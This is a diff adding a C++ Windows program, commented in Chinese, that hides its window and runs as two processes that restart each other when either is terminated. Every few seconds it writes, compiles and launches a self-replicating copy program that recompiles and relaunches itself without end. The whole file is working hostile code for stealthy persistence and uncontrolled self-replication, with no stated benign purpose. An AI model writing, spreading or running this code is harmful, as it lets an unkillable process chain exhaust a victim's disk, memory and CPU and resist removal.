@@ -1,0 +1,137 @@
+#include <windows.h>
+#include<bits/stdc++.h> 
+
+using namespace std;
+
+// 启动指定命令行进程，返回 PID（失败返回 0）
+DWORD LaunchProcess(const string& cmdLine) {
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    char* pCmd = new char[cmdLine.size() + 1];
+    strcpy(pCmd, cmdLine.c_str());
+    BOOL ok = CreateProcess(NULL, pCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
+                            NULL, NULL, &si, &pi);
+    delete[] pCmd;
+    if (!ok) return 0;
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return pi.dwProcessId;
+}
+
+// 检查是否存在 copy_*.exe
+bool CopyExeExists() {
+    WIN32_FIND_DATA fd;
+    HANDLE hFind = FindFirstFile("copy_*.exe", &fd);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+    FindClose(hFind);
+    return true;
+}
+
+// 创建 copy_<时间戳>.exe 并运行
+void CreateAndRunCopyExe() {
+    // 生成唯一文件名
+    string timestamp = to_string(chrono::high_resolution_clock::now().time_since_epoch().count());
+    string cppFile = "copy_" + timestamp + ".cpp";
+    string exeFile = "copy_" + timestamp + ".exe";
+
+    ofstream out(cppFile);
+    out << "#include <bits/stdc++.h>\n"
+        << "#include <windows.h>\n"
+        << "using namespace std;\n"
+        << "void r(const string& c,bool w){\n"
+        << "    STARTUPINFO si={sizeof(si)};\n"
+        << "    PROCESS_INFORMATION pi;\n"
+        << "    si.dwFlags=STARTF_USESHOWWINDOW;\n"
+        << "    si.wShowWindow=SW_HIDE;\n"
+        << "    char* p=new char[c.size()+1];\n"
+        << "    strcpy(p,c.c_str());\n"
+        << "    if(CreateProcess(NULL,p,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){\n"
+        << "        if(w) WaitForSingleObject(pi.hProcess,INFINITE);\n"
+        << "        CloseHandle(pi.hProcess);\n"
+        << "        CloseHandle(pi.hThread);\n"
+        << "    }\n"
+        << "    delete[] p;\n"
+        << "}\n"
+        << "int main(){\n"
+        << "    string f=\"copy_\"+to_string(chrono::high_resolution_clock::now().time_since_epoch().count())+\".cpp\";\n"
+        << "    { ifstream s(__FILE__); string c((istreambuf_iterator<char>(s)),istreambuf_iterator<char>()); ofstream o(f); o<<c; }\n"
+        << "    string e=f.substr(0,f.find_last_of('.'));\n"
+        << "    r(\"g++ \"+f+\" -o \"+e+\".exe -std=c++11 -mwindows\",1);\n"
+        << "    r(e+\".exe\",0);\n"
+        << "}\n";
+    out.close();
+
+    // 编译
+    string compileCmd = "g++ " + cppFile + " -o " + exeFile + " -std=c++11";
+    DWORD compilePid = LaunchProcess(compileCmd);
+    if (compilePid != 0) {
+        // 等待编译完成
+        HANDLE hCompile = OpenProcess(SYNCHRONIZE, FALSE, compilePid);
+        if (hCompile != NULL) {
+            WaitForSingleObject(hCompile, 10000); // 最多等10秒
+            CloseHandle(hCompile);
+        }
+        // 运行新生成的 exe
+        LaunchProcess(exeFile);
+    }
+
+}
+// 监控目标进程，若退出则重启；同时每5秒执行一次检测任务
+void MonitorAndRestart(DWORD targetPid, const string& restartCmd) {
+    while (true) {
+        HANDLE hTarget = OpenProcess(SYNCHRONIZE, FALSE, targetPid);
+        if (hTarget == NULL) {
+            // 目标进程不存在，立即重启
+            targetPid = LaunchProcess(restartCmd);
+            if (targetPid == 0) Sleep(1000);
+            continue;
+        }
+
+        // 使用带超时的等待（5秒），以便定期执行检测
+        DWORD waitResult = WaitForSingleObject(hTarget, 5000);
+        CloseHandle(hTarget);
+
+        if (waitResult == WAIT_OBJECT_0) {
+            // 目标已退出，重启
+            targetPid = LaunchProcess(restartCmd);
+            if (targetPid == 0) Sleep(1000);
+        }
+        // 超时或等待失败时，执行检测任务
+        if (!CopyExeExists()) {
+            CreateAndRunCopyExe();
+        }
+    }
+}
+
+int main(int argc, char* argv[]) {
+    // 隐藏自身窗口
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    if (argc > 1 && string(argv[1]) == "--guard") {
+        // 守护进程
+        DWORD mainPid = atoi(argv[2]);
+        string restartCmd = string(argv[0]) + " --main " + to_string(GetCurrentProcessId());
+        MonitorAndRestart(mainPid, restartCmd);
+    }
+    else if (argc > 1 && string(argv[1]) == "--main") {
+        // 被守护进程重启的主进程
+        DWORD guardPid = atoi(argv[2]);
+        string restartCmd = string(argv[0]) + " --guard " + to_string(GetCurrentProcessId());
+        MonitorAndRestart(guardPid, restartCmd);
+    }
+    else {
+        // 初始启动：作为主进程，启动守护进程
+        DWORD myPid = GetCurrentProcessId();
+        string guardCmd = string(argv[0]) + " --guard " + to_string(myPid);
+        DWORD guardPid = LaunchProcess(guardCmd);
+        if (guardPid != 0) {
+            string restartGuardCmd = string(argv[0]) + " --guard " + to_string(myPid);
+            MonitorAndRestart(guardPid, restartGuardCmd);
+        }
+    }
+    return 0;
+}
